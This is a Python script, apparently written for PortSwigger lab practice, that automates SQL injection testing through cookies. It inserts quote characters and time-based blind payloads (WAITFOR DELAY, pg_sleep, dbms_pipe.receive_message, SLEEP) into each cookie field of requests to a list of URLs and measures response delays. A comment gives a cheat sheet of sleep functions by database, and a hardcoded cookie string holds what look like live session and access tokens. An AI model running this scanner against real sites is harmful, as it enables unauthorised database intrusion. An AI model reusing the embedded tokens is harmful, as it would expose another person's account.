import requests
import threading
import argparse
from colorama import Fore, Style, init
import urllib3
from http.cookies import SimpleCookie

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Example cookie string
url= "https://0ad2002c035a3a3ad86e8b02001a008e.web-security-academy.net/filter?category=Accessories"

cookie_string = """api_uid=CnBoZGeEEp2QggBdS61hAg==; region=210; language=en; currency=GBP; timezone=Africa%2FCairo; _nano_fp=Xpmqn5mol0m8npXaX9_8KK9ZMaiH8g44jj_OIuX5; _bee=1f3rGHksg10p6O7cK7ASnd8omzfxvaoE; njrpl=1f3rGHksg10p6O7cK7ASnd8omzfxvaoE; dilx=FZIc4gsRHvYKhuKOWEJQf; hfsc=L3yJfo4w4Tnw05LKfQ==; g_state={"i_p":1736716149205,"i_l":1}; _hal_tag=APVkxVFf/z6mfCzQGTDC4mfpLtfe2s/4m58ETt4MXE0VxTG0r3Q2WuQ7RwQUGPFdRg==; AccessToken=TBQGY6TE7DV5W2U73PMFF7E2SGEORJUC7HYDUQEMXU7WUV32NDXA0110d253d05a; user_uin=BALW7KC65EVLZOBYAMOJEUTHFCLUFWVUTPTIO3SP; isLogin=1739261640806; privacy_setting_detail=%7B%22firstPAds%22%3A0%2C%22adj%22%3A0%2C%22fbsAnlys%22%3A0%2C%22fbEvt%22%3A0%2C%22ggAds%22%3A0%2C%22fbAds%22%3A0%2C%22ttAds%22%3A0%2C%22scAds%22%3A0%2C%22ptAds%22%3A0%2C%22bgAds%22%3A0%2C%22tblAds%22%3A0%2C%22obAds%22%3A0%7D; webp=1; __cf_bm=QGWn6Fuf.iwPZh2KwLBSS.R7et0ljMTpqEDYN6XeMYI-1739338861-1.0.1.1-.v0Ef7ZnG_YqS1j7gihCpAyYE1qJEt6OY.CE2_h9qcU9hY1j2Vxl9yzoJ7yjbqAKqvVZlJIf9OVAs2iCo2pXkw; __tclr=bikeoKtynP2l9t2JOl6mdRWj8F8Swn1ZtgZeRJ1o/bB40FNUZWYvtcCLNrWsbmShxy3HraZBiJ+TPTzlUVIIqpHJU1+WeWJE2WPOTkQhvKiifLQ4c3+ceHaRQOQjCkrKiZ9pxQ==-1739339553-x64z0z0o"""


init(autoreset=True)

def print_logo():
    print(Fore.BLUE + "")
    print(Fore.BLUE + "  _____   _______            _______   _______  _____  _______")
    print(Fore.BLUE + " |_____  |_______| |            |     |______  |_____     |    ")
    print(Fore.BLUE + " ______|         | |______      |     |_______ ______|    |  ")
    print(Fore.RED + "                                                                ")
    print(Fore.RED + "        Coded by __> @ahmed Abdulwhhab 0x (you are welcome)\n")
    print(Fore.RESET + "")


proxies = {
            "http": "http://127.0.0.1:8090",
            "https": "http://127.0.0.1:8090"
        }



def test_Cookie_initiate_request_without_time_dealy(urls, proxy):
    try:

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'application/json, text/plain,txt/doc, */*',
            'Connection': 'keep-alive'
        }
        payloads={"""'""",'"'}
        for url in urls:
            url = url.strip()
        
            cookie_string_mod = cookie_string
            cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))

            response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
            if response.status_code == 200:
                    print(Fore.GREEN + f"Success: {url} - Status Code: {response.status_code} - response.length: {response.headers.get('Content-Length')}")
                    cookies = response.cookies
            
                    ##print cookies
                    for cookie in cookies:
                        print(f"Name: {cookie.name},  Value: {cookie.value}")
            else:
                    print(Fore.YELLOW + f"Error: {url} - Status Code: {response.status_code}")        
            # Character to find
            char = ";"
    
            count = 0
            for index, c in enumerate(cookie_string):
                if c == char:
                    #if count == 2:
                    for payload in payloads:
                        cookie_string_mod = cookie_string[0:index] +payload+";"+cookie_string[index+1:]
                
                        cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))
                        response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
                 
                        if response.status_code == 200:
                            print(Fore.GREEN + f"Success: {url} - Status Code: {response.status_code} - response.length: {response.headers.get('Content-Length')}")
                            cookies = response.cookies
            
                            ##print cookies
                            for cookie in cookies:
                                print(f"Name: {cookie.name},  Value: {cookie.value}")
                        else:
                            print(Fore.YELLOW + f"Error: {url} - Status Code: {response.status_code}")
                    count += 1
                else:
                    pass
        # # at End of cookie add '
        cookie_string_mod = cookie_string+"'"
        cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))

        response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
        if response.status_code == 200:
            print(Fore.GREEN + f"Success: {url} - Status Code: {response.status_code} - response.length: {response.headers.get('Content-Length')}")
            cookies = response.cookies
    
            ##print cookies
            for cookie in cookies:
                print(f"Name: {cookie.name},  Value: {cookie.value}")
        else:
                print(Fore.YELLOW + f"Error: {url} - Status Code: {response.status_code}")
                count += 1        
    except Exception as e:
        print(Fore.RED + f"Failed: {url} - Error: {str(e)}")
        
        
from time import time        
def test_Cookie_initiate_request_with_time_dealy(urls, proxy):
    try:

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'application/json, text/plain,txt/doc, */*',
            'Connection': 'keep-alive'
        }
        payloads={"'+WAITFOR DELAY '0:0:30'+--+","'||dbms_pipe.receive_message(('a'),30)","'||pg_sleep(10)+--+","' SELECT SLEEP(30)+--+"}
        """
        Oracle 	'foo'||'bar'        Oracle 	dbms_pipe.receive_message(('a'),10) 
        Microsoft 	'foo'+'bar'     Microsoft 	WAITFOR DELAY '0:0:10'
        PostgreSQL 	'foo'||'bar'    PostgreSQL 	SELECT pg_sleep(10)
        MySQL 	'foo' 'bar' [Note the space between the two strings]
        CONCAT('foo','bar')         MySQL 	SELECT SLEEP(10) 
        """
        for url in urls:
            url = url.strip()
            cookie_string_mod = cookie_string
            cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))
    
            startTime = time()
            response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
            endTime = time()
        
            finalTime = endTime - startTime
    
            if finalTime >= 10:
                print(f'[+] Payload triggered, slept for {finalTime:.2f}s')
            else:
                print(f'[-] Payload didn\'t trigger, slept for {finalTime:.2f}s')
    
            
                # Character to find
            char = ";"
        
            count = 0
            for index, c in enumerate(cookie_string):
                if c == char:
                    #if count == 2:
                    for payload in payloads:
                        cookie_string_mod = cookie_string[0:index] +payload+";"+cookie_string[index+1:]
                    
                        cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))
                        startTime = time()
                        response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
                        endTime = time()
        
                        finalTime = endTime - startTime
    
                        if finalTime >= 10:
                            print(f'[+] Payload triggered, slept for {finalTime:.2f}s')
                        else:
                            print(f'[-] Payload didn\'t trigger, slept for {finalTime:.2f}s')
                    
            # # at End of cookie add '
            cookie_string_mod = cookie_string+"'"
            cookies = (dict(i.split('=',1) for i in cookie_string_mod.split(';')))
    
            response = requests.get(url, proxies=proxies,cookies=cookies, verify=False,headers=headers)
            if response.status_code == 200:
                print(Fore.GREEN + f"Success: {url} - Status Code: {response.status_code} - response.length: {response.headers.get('Content-Length')}")
                cookies = response.cookies
        
                ##print cookies
                for cookie in cookies:
                    print(f"Name: {cookie.name},  Value: {cookie.value}")
            else:
                    print(Fore.YELLOW + f"Error: {url} - Status Code: {response.status_code}")
                    count += 1        
    except Exception as e:
            print(Fore.RED + f"Failed: {url} - Error: {str(e)}")
                




def main():
    print_logo()

    parser = argparse.ArgumentParser(
        usage=argparse.SUPPRESS,
        description=Fore.WHITE + "Example: passurls -p [PROXY] -l [LIST] -c [COOKIE]" + Fore.CYAN,
        formatter_class=argparse.RawTextHelpFormatter,
    )

    parser.add_argument('-l', '--list', type=str, required=True, metavar='', help=Fore.CYAN + "Path to the list of URLs (e.g. /path/to/list.txt)")
    parser.add_argument('-p', '--proxy', type=str, required=True, metavar='', help=Fore.CYAN + "Proxy address (e.g. http://127.0.0.1:8080)")
    

    args = parser.parse_args()

    with open(args.list, 'r') as file:
        urls = file.readlines()
    test_Cookie_initiate_request_without_time_dealy(urls, args.proxy)
    test_Cookie_initiate_request_with_time_dealy(urls, args.proxy)
    

if __name__ == "__main__":
    main()
